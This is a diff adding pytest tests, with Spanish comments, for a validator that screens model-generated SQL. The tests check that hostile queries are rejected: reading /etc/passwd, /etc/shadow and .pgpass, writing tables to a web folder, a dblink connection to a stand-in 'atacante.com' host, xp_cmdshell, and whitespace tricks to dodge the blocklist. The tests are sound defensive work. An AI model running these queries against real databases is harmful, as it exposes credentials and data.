@@ -191,3 +191,64 @@ def test_la_confianza_nunca_se_va_de_rango(catalogo):
                 c = kcbd.calcular_confianza(conf, sim, valido, 0, usa_cte=True)
                 assert 0 <= c["puntaje"] <= 100, c
                 assert 0 <= c["desde"] <= 100 and 0 <= c["hasta"] <= 100, c
+
+
+# ---------------------------------------------------------------------------
+# La otra mitad: un SELECT también saca datos de la máquina
+# ---------------------------------------------------------------------------
+# La lista de prohibidas miraba solo la ESCRITURA. Pero un SELECT puede
+# escribir un archivo en el servidor con el resultado, y puede leer archivos
+# del servidor y devolverlos como si fueran filas. Todo eso lo redacta un
+# modelo a partir de una frase en español que escribe el usuario.
+#
+# Comprobado contra el validador anterior: los cinco pasaban.
+@pytest.mark.parametrize("sql,que_hacía", [
+    ("SELECT * FROM cartera INTO OUTFILE '/var/www/html/fuga.csv'",
+     "escribe la cartera entera en una carpeta servida por web"),
+    ("SELECT * FROM cartera INTO DUMPFILE '/tmp/cartera.bin'",
+     "vuelca la cartera a un archivo del servidor"),
+    ("SELECT pg_read_file('/etc/passwd')",
+     "lee un archivo del servidor y lo devuelve como filas"),
+    ("SELECT load_file('/var/lib/pgsql/.pgpass')",
+     "lee las credenciales de la propia base"),
+    ("SELECT pg_ls_dir('/')",
+     "lista el disco del servidor"),
+    ("SELECT lo_import('/etc/shadow')",
+     "importa un archivo del servidor a la base"),
+    ("SELECT * FROM dblink('host=atacante.com', 'SELECT 1') AS t(a int)",
+     "abre una conexión saliente a otra base"),
+    ("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;', 'SELECT 1')",
+     "lee de un servidor remoto"),
+    ("SELECT * FROM cartera FOR UPDATE",
+     "toma candados sobre la cartera desde una pantalla de solo lectura"),
+])
+def test_un_select_tampoco_puede_tocar_el_disco_del_servidor(catalogo, sql, que_hacía):
+    ok, problemas, _ = kcbd.validar_sql(sql, catalogo)
+    assert not ok, f"pasa una consulta que {que_hacía}: {sql}"
+    assert problemas
+
+
+def test_los_espacios_no_alcanzan_para_esquivar_la_lista(catalogo):
+    """Se buscaba el substring `"exec "` — con el espacio pegado. `exec(`,
+    `exec\\n` y `EXEC\\t` no lo tenían y pasaban derecho."""
+    for sql in ("exec(0x31303235)", "EXEC\txp_cmdshell 'dir'",
+                "SELECT * FROM cartera INTO   OUTFILE '/tmp/x'",
+                "SELECT * FROM cartera\nFOR\nSHARE"):
+        ok, problemas, _ = kcbd.validar_sql(sql, catalogo)
+        assert not ok, f"esquivó la lista cambiando el espaciado: {sql!r}"
+
+
+def test_la_lista_nueva_no_rechaza_el_sql_normal(catalogo):
+    """La falla que más se subestima: si el SQL legítimo empieza a rebotar, el
+    cliente aprende que la función no anda y deja de usarla. Ninguna de estas
+    puede romperse por las palabras nuevas."""
+    for sql in (
+        "SELECT id_deudor, monto_deuda FROM cartera WHERE dias_mora > 90",
+        "-- morosos por tramo\nSELECT dias_mora, COUNT(*) FROM cartera "
+        "GROUP BY dias_mora ORDER BY 2 DESC",
+        "WITH morosos AS (SELECT id_deudor FROM cartera WHERE dias_mora > 60) "
+        "SELECT COUNT(*) FROM morosos",
+        "SELECT AVG(c.monto_deuda) FROM cartera c",
+    ):
+        ok, problemas, _ = kcbd.validar_sql(sql, catalogo)
+        assert ok, f"rechaza SQL correcto: {sql!r} -> {problemas}"
